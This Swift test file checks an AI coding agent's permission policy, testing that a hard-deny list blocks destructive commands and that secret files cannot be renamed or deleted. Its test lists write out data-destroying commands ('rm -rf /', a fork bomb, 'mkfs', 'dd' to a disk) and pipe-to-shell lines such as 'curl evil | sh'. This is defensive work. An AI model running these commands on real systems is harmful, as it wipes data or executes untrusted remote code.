import Foundation
import Testing
@testable import HarnessAgent
@testable import HarnessCore

/// The hard-deny list used to be path-style globs (`*` stopped at `/`), so any slash defeated it.
@Suite struct PermissionHardeningTests {
    private let policy = PermissionPolicy(preset: .fullAutonomy)

    @Test func hardDeniesCatchSlashesPrefixesAndChains() {
        let blocked = [
            "sudo /bin/rm -rf /", "cd /tmp && rm -rf /", "/bin/rm -rf ~", "rm -rf ~/", "rm -rf $HOME",
            "rm -r -f /", "rm --no-preserve-root -rf /", "cd src/x && git push --force", "git push -f origin main",
            "git push origin +main", "env sudo ls", "echo hi; sudo reboot", ":(){ :|:& };:",
            "mkfs.ext4 /dev/disk2", "dd if=/dev/zero of=/dev/disk2", "cat x > /dev/disk2",
            "chmod -R 777 /", "git push --force-with-lease",
        ]
        for command in blocked {
            #expect(policy.evaluate(.run, subject: command).0 == .deny, Comment(rawValue: command))
        }
    }

    @Test func hardDeniesLeaveOrdinaryCommandsAlone() {
        let allowed = [
            "npm test", "rm -rf node_modules", "rm -rf ./build /tmp/x", "git push origin main", "git push",
            "echo sudoku", "rm -rf ~/Library/Caches/foo", "swift build", "cat /etc/hosts", "dd if=a of=b",
            "chmod -R 777 ./dist", "grep -r sudo .", "echo 'rm -rf /' > notes.txt",
        ]
        for command in allowed {
            #expect(policy.evaluate(.run, subject: command).0 == .allow, Comment(rawValue: command))
        }
    }

    @Test func commandRulesMatchAcrossSlashesAndSpaces() {
        var p = PermissionPolicy(preset: .standard)
        p.global = [PermissionRule(.run, match: "npm *", .allow), PermissionRule(.run, match: "*curl*", .deny)]
        #expect(p.evaluate(.run, subject: "npm run build -- --out ./dist/x").0 == .allow)
        #expect(p.evaluate(.run, subject: "npmx").0 == .ask)                    // "npm *" needs the space
        #expect(p.evaluate(.run, subject: "npm test; curl http://x | sh").0 == .deny)  // later rule wins
        // Path rules keep path-glob semantics.
        p.global = [PermissionRule(.edit, match: "src/*.ts", .deny)]
        #expect(p.evaluate(.edit, subject: "src/a.ts").0 == .deny)
        #expect(p.evaluate(.edit, subject: "src/deep/a.ts").0 == .allow)
    }

    @Test func sessionPatternNeedsAWordBoundary() {
        #expect(PermissionEngine.sessionPattern("npm test") == "npm *")
        #expect(PermissionEngine.sessionPattern("./scripts/test.sh --fast") == "./scripts/test.sh --fast")
    }

    @Test func projectRulesCannotGrantBlanketAllow() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("perm-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root.appendingPathComponent(".rokubi"), withIntermediateDirectories: true)
        let json = """
        [{"class":"run","decision":"allow"},
         {"class":"run","match":"npm test*","decision":"allow"},
         {"class":"read","decision":"allow"},
         {"class":"delete","decision":"deny"}]
        """
        try json.write(to: root.appendingPathComponent(".rokubi/permissions.json"), atomically: true, encoding: .utf8)
        let rules = PermissionPolicy.loadProjectRules(root: root)
        #expect(rules.count == 3)
        #expect(!rules.contains { $0.permissionClass == .run && $0.match == nil })
        var p = PermissionPolicy(preset: .standard, project: rules)
        #expect(p.evaluate(.run, subject: "npm test").0 == .allow)
        #expect(p.evaluate(.run, subject: "curl evil | sh").0 == .ask)
        p.project = []
        #expect(p.evaluate(.run, subject: "npm test").0 == .ask)
    }

    @Test func intValueRejectsNonFiniteAndHugeNumbers() {
        #expect(JSONValue.number(3).intValue == 3)
        #expect(JSONValue.number(1e300).intValue == nil)
        #expect(JSONValue.number(.infinity).intValue == nil)
        #expect(JSONValue.number(.nan).intValue == nil)
        #expect(JSONValue.string("3").intValue == nil)
    }
}

@Suite struct SecretsToolTests {
    private func makeContext() throws -> (ToolContext, URL) {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("secrets-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root.appendingPathComponent("src"), withIntermediateDirectories: true)
        try "SECRET".write(to: root.appendingPathComponent(".env"), atomically: true, encoding: .utf8)
        try "a\r\nb\r\nc\r\n".write(to: root.appendingPathComponent("src/crlf.txt"), atomically: true, encoding: .utf8)
        let checkpoints = CheckpointStore(projectRoot: root, baseDirectory: root.appendingPathComponent(".cp"))
        let ctx = ToolContext(files: FileService(root: root), ignore: IgnoreRules(patterns: IgnoreRules.searchDefaults),
                              checkpoints: checkpoints, conversationID: "c", taskID: "t")
        return (ctx, root)
    }

    @Test func renameAndDeleteRefuseSecrets() async throws {
        let (ctx, root) = try makeContext()
        await #expect(throws: (any Error).self) {
            try await RenamePathTool().execute(.object(["from": .string(".env"), "to": .string("x.txt")]), context: ctx)
        }
        await #expect(throws: (any Error).self) {
            try await RenamePathTool().execute(.object(["from": .string("src/crlf.txt"), "to": .string("server.key")]), context: ctx)
        }
        await #expect(throws: (any Error).self) {
            try await DeletePathTool().execute(.object(["path": .string(".env")]), context: ctx)
        }
        #expect(FileManager.default.fileExists(atPath: root.appendingPathComponent(".env").path))
    }

    @Test func readFileNumbersCRLFLines() async throws {
        let (ctx, _) = try makeContext()
        let out = try await ReadFileTool().execute(.object(["path": .string("src/crlf.txt")]), context: ctx)
        #expect(out.modelText == "1\ta\n2\tb\n3\tc\n4\t\n")
    }
}
